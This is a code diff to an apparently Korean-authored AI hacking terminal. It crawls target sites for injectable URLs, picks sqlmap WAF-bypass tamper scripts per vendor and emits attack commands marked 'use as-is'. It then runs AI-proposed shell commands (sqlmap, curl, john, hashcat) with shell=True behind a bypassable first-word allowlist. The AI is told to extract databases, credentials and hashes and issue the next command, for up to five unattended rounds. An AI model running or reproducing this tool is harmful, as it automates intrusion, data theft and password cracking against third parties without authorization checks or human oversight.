@@ -218,17 +218,34 @@ class BingoTerminal:
         return Message(role="system", content=system_text)
 
     def _get_skill_context(self, text: str) -> str:
-        """사용자 입력에서 관련 스킬 자동 검색 후 AI 컨텍스트 문자열 반환"""
+        """사용자 입력에서 관련 스킬 자동 검색 후 AI 컨텍스트 문자열 반환.
+
+        우선순위:
+          1. SecSkills-main / advsec-plus 로컬 references/ (가장 정확, 환각 방지)
+          2. CyberSecurity-Skills 내장 DB (보조)
+        """
         from ..skills.engine import SkillEngine
         engine = SkillEngine()
-        results = engine.search(text)
-        if not results:
-            return ""
-        parts = []
-        for r in results[:3]:
-            prompt = engine.get_skill_prompt(r["id"])
-            if prompt:
-                parts.append(prompt)
+
+        parts: list[str] = []
+
+        # ── 1. 로컬 SecSkills references 검색 (우선) ─────────────────
+        local_ctx = engine.local_skill_context(text, max_chars=3500)
+        if local_ctx:
+            parts.append(
+                "=== SKILL_CONTEXT (verified reference — cite with [引用:references/file.md]) ===\n"
+                + local_ctx
+                + "\n=== END SKILL_CONTEXT ==="
+            )
+
+        # ── 2. 내장 CyberSecurity-Skills DB (보조) ───────────────────
+        if not parts:
+            results = engine.search(text)
+            for r in results[:3]:
+                prompt = engine.get_skill_prompt(r["id"])
+                if prompt:
+                    parts.append(prompt)
+
         return "\n\n".join(parts)
 
     def _auto_waf_scan(self, text: str) -> str:
@@ -309,57 +326,103 @@ class BingoTerminal:
                 results.append(f"WAF_SCAN_ERROR: {e2}")
                 return "\n".join(results)
 
-        # ── 결과 출력 + sqlmap 명령 생성 ──────────────────────────────
+        # ── WAF 결과 출력 ─────────────────────────────────────────────
+        tamper_map = {
+            "cloudflare":  "space2comment,between,charencode,randomcase",
+            "aws":         "space2mysqlblank,equaltolike,greatest",
+            "modsecurity": "space2comment,between,modsecurityversioned",
+            "wordfence":   "space2comment,between,charencode",
+            "sucuri":      "space2comment,randomcase,charencode",
+            "akamai":      "space2comment,between,charencode,randomcase",
+        }
         if waf_detected and waf_type:
-            self.console.print(
-                f"[{THEME['error']}]{self.s['waf_detected']}: {waf_type}[/]"
-            )
-
-            # WAF 타입에 따른 tamper 선택
-            tamper_map = {
-                "cloudflare": "space2comment,between,charencode,randomcase",
-                "aws":        "space2mysqlblank,equaltolike,greatest",
-                "modsecurity": "space2comment,between,modsecurityversioned",
-                "wordfence":   "space2comment,between,charencode",
-                "sucuri":      "space2comment,randomcase,charencode",
-                "akamai":      "space2comment,between,charencode,randomcase",
-            }
+            self.console.print(f"[{THEME['error']}]{self.s['waf_detected']}: {waf_type}[/]")
             key = waf_type.lower().split()[0] if waf_type else ""
-            tamper = next(
-                (v for k, v in tamper_map.items() if k in key),
-                "space2comment,between,charencode"  # default
-            )
-
-            sqlmap_cmd = (
-                f'sqlmap -u "{url}?id=1" '
-                f'--tamper={tamper} '
-                f'--delay=2 --random-agent --level=3 --risk=2 --batch --dbs'
-            )
-
-            results.append(
-                f"WAF_SCAN_RESULT:\n"
-                f"  url={url}\n"
-                f"  waf_detected=True\n"
-                f"  waf_type={waf_type}\n"
-                f"  raw_output={raw_output[:300]}\n\n"
-                f"SQLMAP_COMMAND (WAF bypass already applied, use as-is):\n"
-                f"  {sqlmap_cmd}"
-            )
-            self.console.print(
-                f"[{THEME['dim']}]  → {sqlmap_cmd[:90]}...[/]"
-            )
+            tamper = next((v for k, v in tamper_map.items() if k in key),
+                          "space2comment,between,charencode")
         else:
             self.console.print(f"[{THEME['success']}]{self.s['waf_none']}[/]")
+            tamper = None
+
+        results.append(
+            f"WAF_SCAN_RESULT:\n"
+            f"  url={url}\n"
+            f"  waf_detected={waf_detected}\n"
+            f"  waf_type={waf_type or 'None'}\n"
+            f"  tamper={tamper or 'None'}\n"
+            f"  raw_output={raw_output[:300]}"
+        )
+
+        # ── Step 2: 사이트 크롤링 → 실제 파라미터 수집 ──────────────
+        self.console.print(
+            f"[{THEME['dim']}]{self.s.get('crawling', '🔍 사이트 크롤 중...')}[/]"
+        )
+        injectable_urls: list[str] = []
+        try:
+            import httpx as _httpx, re as _re
+            headers = {"User-Agent": "Mozilla/5.0 (compatible; bingo-scanner/1.0)"}
+            resp = _httpx.get(url, follow_redirects=True, timeout=10, headers=headers)
+            page = resp.text
+            # href, action에서 URL 추출
+            found_urls = _re.findall(
+                r'(?:href|action)=["\']([^"\'<>\s]+)["\']', page, _re.IGNORECASE
+            )
+            base = url.rstrip("/")
+            for fu in found_urls:
+                if fu.startswith("http"):
+                    full = fu
+                elif fu.startswith("/"):
+                    full = base.split("/")[0] + "//" + base.split("/")[2] + fu
+                else:
+                    full = base + "/" + fu
+                # 쿼리 파라미터가 있는 URL만 SQLi 후보
+                if "?" in full and "=" in full:
+                    injectable_urls.append(full)
+            injectable_urls = list(dict.fromkeys(injectable_urls))[:10]  # 중복 제거, 최대 10개
+        except Exception as e:
+            results.append(f"CRAWL_ERROR: {e}")
+
+        if injectable_urls:
+            self.console.print(
+                f"[{THEME['success']}]{self.s.get('params_found', '✓ 파라미터 발견')}:"
+            )
+            for u in injectable_urls[:5]:
+                self.console.print(f"  [{THEME['dim']}]{u}[/]")
+
             results.append(
-                f"WAF_SCAN_RESULT:\n"
-                f"  url={url}\n"
-                f"  waf_detected=False\n"
-                f"  raw_output={raw_output[:200]}\n\n"
-                f"SQLMAP_COMMAND (no WAF — direct attack):\n"
-                f'  sqlmap -u "{url}?id=1" --batch --random-agent --level=3 --dbs'
+                f"CRAWL_RESULT:\n"
+                + "\n".join(f"  injectable_url={u}" for u in injectable_urls)
             )
 
-        # ── 빠른 핑거프린트 (실패해도 무시) ──────────────────────────
+            # 첫 번째 파라미터 URL로 sqlmap 명령 생성
+            target_url = injectable_urls[0]
+            if tamper:
+                sqlmap_cmd = (
+                    f'sqlmap -u "{target_url}" '
+                    f'--tamper={tamper} '
+                    f'--delay=2 --random-agent --level=3 --risk=2 --batch --dbs'
+                )
+            else:
+                sqlmap_cmd = (
+                    f'sqlmap -u "{target_url}" '
+                    f'--batch --random-agent --level=3 --dbs'
+                )
+            results.append(
+                f"SQLMAP_COMMAND (real parameter URL — use as-is):\n"
+                f"  {sqlmap_cmd}"
+            )
+            self.console.print(f"[{THEME['dim']}]  → {sqlmap_cmd[:100]}[/]")
+        else:
+            # 파라미터를 못 찾은 경우 → AI에게 직접 크롤 지시
+            results.append(
+                "CRAWL_RESULT: No GET parameters found on homepage.\n"
+                "INSTRUCTION FOR AI: Do NOT use ?id=1. Instead:\n"
+                "  1. Run: curl -s -L -A 'Mozilla/5.0' " + url + "/ | grep -Po 'href=\"\\K[^\"]*(?=\")' | sort -u\n"
+                "  2. Find URLs with query parameters (e.g. ?idx=1, ?cate=0001)\n"
+                "  3. Run sqlmap on those REAL parameter URLs only"
+            )
+
+        # ── 빠른 핑거프린트 ──────────────────────────────────────────
         try:
             from ..tools.http_probe import HttpProbe
             with self.console.status(f"[{THEME['dim']}]{self.s['waf_fingerprint']}[/]"):
@@ -367,7 +430,6 @@ class BingoTerminal:
             tech = ", ".join(fp.get("tech", [])) or "unknown"
             results.append(
                 f"FINGERPRINT:\n"
-                f"  url={url}\n"
                 f"  tech_stack={tech}\n"
                 f"  cms={fp.get('cms', 'unknown')}\n"
                 f"  server={fp.get('server', 'unknown')}"
@@ -551,11 +613,12 @@ class BingoTerminal:
             "/lang":    self._cmd_lang,
             "/quit":    self._cmd_quit,
             "/exit":    self._cmd_quit,
-            "/skill":   self._cmd_skill,
         }
         fn = dispatch.get(name)
         if fn:
             fn()
+        elif name == "/skill":
+            self._cmd_skill(arg)
         elif name == "/tools":
             self._cmd_tools(arg)
         elif name == "/scan":
@@ -827,30 +890,38 @@ class BingoTerminal:
 
     def _execute_ai_commands(self, response: str) -> None:
         """
-        AI 응답의 ```bash 블록에서 명령을 추출해 실제 실행.
-        sqlmap / curl / wafw00f 등 지원 명령만 실행 (안전 필터 적용).
-        실행 결과를 히스토리에 추가해 AI가 다음 턴에 실제 데이터로 답변하도록 함.
-        """
-        import re, subprocess, shlex, threading
+        AI가 ```bash 블록에 명령을 제시하면 실제로 실행하고
+        결과를 AI에게 피드백 → AI가 실제 데이터로 분석함.
 
-        # ```bash ... ``` 블록 추출
-        bash_blocks = re.findall(r"```(?:bash|sh)\s*(.*?)```", response, re.DOTALL)
+        AWAITING_BINGO_EXECUTION 키워드가 있을 때 또는
+        bash 블록 + 보안 명령이 있을 때 실행.
+        """
+        import re, subprocess, shlex
+
+        # ```bash/sh 블록 전부 추출 (```없는 일반 블록도 포함)
+        bash_blocks = re.findall(
+            r"```(?:bash|sh)?\s*(.*?)```", response, re.DOTALL
+        )
         if not bash_blocks:
             return
 
-        # 실행 허용 명령 접두사 (위험 명령 방지)
-        _ALLOWED = ("sqlmap", "curl", "wafw00f", "nmap", "nikto",
-                    "ffuf", "gobuster", "nuclei", "httpx", "subfinder")
+        # 실행 허용 명령 (안전 목록)
+        _ALLOWED = {
+            "sqlmap", "curl", "wafw00f", "nmap", "nikto",
+            "ffuf", "gobuster", "nuclei", "httpx", "subfinder",
+            "amass", "whatweb", "john", "hashcat",
+        }
 
         results_text = []
 
         for block in bash_blocks:
-            # 첫 번째 명령만 추출 (멀티라인 블록도 첫 줄)
-            lines = [l.strip() for l in block.strip().splitlines()
+            # 줄 이어붙이기 (백슬래시 라인 이어붙임)
+            joined = block.strip().replace("\\\n", " ")
+            lines = [l.strip() for l in joined.splitlines()
                      if l.strip() and not l.strip().startswith("#")]
             if not lines:
                 continue
-            cmd_line = lines[0]
+            cmd_line = " ".join(lines)  # 멀티라인 명령 합치기
 
             # 허용 목록 확인
             try:
@@ -859,65 +930,87 @@ class BingoTerminal:
                 continue
             if not parts:
                 continue
-            binary = parts[0].split("/")[-1]  # 경로 포함 시 basename
+            binary = parts[0].split("/")[-1]
             if binary not in _ALLOWED:
                 continue
 
-            # 실제 실행 (최대 120초)
+            # 이미 실행된 명령이면 스킵 (BINGO REAL EXECUTION RESULTS에 있으면)
+            history_text = " ".join(
+                m.content for m in self.history if m.role == "user"
+            )
+            if f"REAL EXECUTION: {cmd_line[:40]}" in history_text:
+                continue
+
+            # 실제 실행
             self.console.print(
-                f"\n[{THEME['secondary']}]▶ {self.s.get('exec_running', 'Running')}:[/] "
-                f"[{THEME['dim']}]{cmd_line[:80]}[/]"
+                f"\n[{THEME['secondary']}]▶ {self.s['exec_running']}:[/] "
+                f"[{THEME['dim']}]{cmd_line[:100]}[/]"
             )
             try:
                 proc = subprocess.run(
-                    cmd_line, shell=True, capture_output=True, text=True, timeout=120
+                    cmd_line, shell=True, capture_output=True,
+                    text=True, timeout=180
                 )
                 output = (proc.stdout or "") + (proc.stderr or "")
                 if output.strip():
-                    # 출력 미리보기 (최대 40줄)
-                    preview_lines = output.strip().splitlines()[:40]
-                    preview = "\n".join(preview_lines)
-                    self.console.print(
-                        f"[{THEME['dim']}]{preview}[/]"
-                    )
+                    preview = "\n".join(output.strip().splitlines()[:50])
+                    self.console.print(f"[{THEME['dim']}]{preview}[/]")
                     results_text.append(
-                        f"=== REAL EXECUTION: {cmd_line[:60]} ===\n{output.strip()}\n"
+                        f"=== REAL EXECUTION: {cmd_line[:80]} ===\n"
+                        f"{output.strip()}\n"
+                        f"=== EXIT CODE: {proc.returncode} ===\n"
+                    )
+                else:
+                    results_text.append(
+                        f"=== REAL EXECUTION: {cmd_line[:80]} ===\n"
+                        f"(no output, exit code {proc.returncode})\n"
                     )
             except subprocess.TimeoutExpired:
-                self.console.print(f"[{THEME['warn']}]  timeout (120s)[/]")
+                self.console.print(f"[{THEME['warn']}]  ⏱ timeout (180s)[/]")
+                results_text.append(
+                    f"=== REAL EXECUTION: {cmd_line[:80]} ===\n(timed out after 180s)\n"
+                )
             except Exception as e:
                 self.console.print(f"[{THEME['error']}]  exec error: {e}[/]")
 
-        # 실행 결과를 다음 AI 턴 컨텍스트에 주입
-        if results_text:
-            injection = (
-                "=== BINGO REAL EXECUTION RESULTS ===\n"
-                + "\n".join(results_text)
-                + "=== Use these REAL results only. Do NOT generate simulated output. ==="
+        if not results_text:
+            return
+
+        # 실행 결과 AI에게 피드백
+        injection = (
+            "=== BINGO REAL EXECUTION RESULTS ===\n"
+            + "\n".join(results_text)
+            + "\n=== END REAL RESULTS ===\n\n"
+            "Analyze the REAL results above. "
+            "Extract all findings (DBs, tables, credentials, hashes). "
+            "Decide and output the NEXT command in ```bash``` format. "
+            "NEVER generate simulated output."
+        )
+        self.history.append(Message(role="user", content=injection))
+
+        from ..models.registry import ModelRegistry
+        model_cfg = self.config.get_active_model_config()
+        if not model_cfg:
+            return
+
+        model = ModelRegistry.build(model_cfg)
+        self.console.print(
+            f"\n[{THEME['secondary']}]{self.s['exec_analyzing']}[/]"
+        )
+        followup_response = self._stream_response(
+            model.chat_stream(self._build_messages(""))
+        )
+        if followup_response:
+            self.history.append(Message(role="assistant", content=followup_response))
+            self._append_to_session_log("assistant", followup_response)
+            self._notify_hashes_found(followup_response)
+            # 연쇄 실행: AI가 또 다음 명령을 제시했으면 재귀 실행 (최대 5턴)
+            exec_count = sum(
+                1 for m in self.history
+                if m.role == "user" and "BINGO REAL EXECUTION RESULTS" in m.content
             )
-            self.history.append(Message(role="user", content=injection))
-            # 실행 결과 기반으로 AI에게 분석 요청
-            from ..models.registry import ModelRegistry
-            model_cfg = self.config.get_active_model_config()
-            if model_cfg:
-                from ..models.system_prompt import wrap_task
-                model = ModelRegistry.build(model_cfg)
-                skill_ctx = ""
-                followup = (
-                    "Above are the REAL command execution results. "
-                    "Analyze them and provide findings, next steps, and any extracted data (DBs, tables, credentials)."
-                )
-                self.history.append(Message(role="user", content=followup))
-                self.console.print(
-                    f"\n[{THEME['secondary']}]{self.s.get('exec_analyzing', '📊 실행 결과 분석 중...')}[/]"
-                )
-                followup_response = self._stream_response(
-                    model.chat_stream(self._build_messages(skill_ctx))
-                )
-                if followup_response:
-                    self.history.append(Message(role="assistant", content=followup_response))
-                    self._append_to_session_log("assistant", followup_response)
-                    self._notify_hashes_found(followup_response)
+            if exec_count < 5:
+                self._execute_ai_commands(followup_response)
 
     def _notify_hashes_found(self, text: str) -> None:
         """AI 응답에서 해시 감지 시 자동 온라인 조회 → 오프라인 크랙 파이프라인 실행"""
@@ -1264,16 +1357,64 @@ class BingoTerminal:
         engine = SkillEngine()
 
         if keyword:
+            # ── 로컬 SecSkills references 검색 (우선) ─────────────────
+            local_results = engine.local_skill_search(keyword)
+            if local_results:
+                self.console.print(
+                    f"\n[{THEME['secondary']}]🔍 SecSkills 레퍼런스 매칭: [bold]{keyword}[/bold][/]"
+                )
+                ref_table = Table(border_style=THEME["primary"], show_header=True)
+                ref_table.add_column("스킬 팩", style=THEME["secondary"], width=20)
+                ref_table.add_column("레퍼런스 파일", style="white", width=30)
+                ref_table.add_column("키워드", style=THEME["dim"])
+                for r in local_results[:10]:
+                    ref_table.add_row(
+                        r["skill_dir"],
+                        r["reference"] or "SKILL.md",
+                        ", ".join(r["matched_keywords"][:3]),
+                    )
+                self.console.print(ref_table)
+                self.console.print(
+                    f"[{THEME['dim']}]💡 이 레퍼런스는 AI 메시지 전송 시 자동으로 컨텍스트에 주입됩니다.[/]"
+                )
+
+            # ── 내장 DB 검색 (보조) ────────────────────────────────────
             results = engine.search(keyword)
             if results:
-                self.console.print(f"\n[{THEME['secondary']}]{self.s['skill_search_result']}: {keyword}[/]")
-                for r in results[:15]:
+                self.console.print(f"\n[{THEME['dim']}]📚 내장 DB 스킬:[/]")
+                for r in results[:10]:
                     self.console.print(f"  [{THEME['primary']}]{r['module']}[/] → {r['skill']}")
-            else:
-                self.console.print(f"[{THEME['dim']}]{self.s['skill_no_result'].format(kw=keyword)}[/]")
+
+            if not local_results and not results:
+                self.console.print(
+                    f"[{THEME['dim']}]{self.s['skill_no_result'].format(kw=keyword)}[/]"
+                )
         else:
-            table = Table(title=f"[{THEME['primary']}]{self.s['skill_module_title']}[/]",
-                          border_style=THEME["primary"])
+            # ── 로컬 스킬 팩 목록 ──────────────────────────────────────
+            local_skills = engine.list_local_skills()
+            if local_skills:
+                ls_table = Table(
+                    title=f"[{THEME['primary']}]📦 SecSkills 로컬 레퍼런스 팩[/]",
+                    border_style=THEME["primary"],
+                )
+                ls_table.add_column("스킬 팩", style=THEME["secondary"], width=22)
+                ls_table.add_column("레퍼런스 수", justify="right", width=10)
+                ls_table.add_column("주요 레퍼런스", style=THEME["dim"])
+                for ls in local_skills:
+                    refs_preview = ", ".join(ls["references"][:4])
+                    if len(ls["references"]) > 4:
+                        refs_preview += f" +{len(ls['references'])-4}..."
+                    ls_table.add_row(ls["name"], str(ls["ref_count"]), refs_preview)
+                self.console.print(ls_table)
+                self.console.print(
+                    f"[{THEME['dim']}]💡 /skill <키워드> 로 특정 레퍼런스 검색 가능 (예: /skill sqlmap)[/]\n"
+                )
+
+            # ── 내장 DB 모듈 목록 ──────────────────────────────────────
+            table = Table(
+                title=f"[{THEME['primary']}]{self.s['skill_module_title']}[/]",
+                border_style=THEME["primary"],
+            )
             table.add_column("ID", style=THEME["secondary"], width=4)
             table.add_column("모듈", style="white")
             table.add_column("스킬 수", justify="right")
